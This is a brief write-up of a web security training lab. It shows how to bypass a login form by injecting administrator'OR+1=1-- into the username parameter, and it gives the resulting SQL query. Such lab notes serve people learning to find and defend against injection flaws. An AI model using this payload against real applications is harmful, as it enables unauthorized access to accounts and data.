## Lab #2: SQL injection vulnerability allowing login bypass

> This lab contains an SQL injection vulnerability in the login function.
>
> To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user. 

Parameter:
```
csrf=XXXXXXXX&username=administrator&password=1
```

Modified:
```
csrf=XXXXXXXX&username=administrator'OR+1=1--&password=1
```

```
SELECT username, password WHERE username='administrator' OR 1=1 -- 'AND password='fahmi'
```

Next: [UNION attack](../03-union-attacks/README.md)
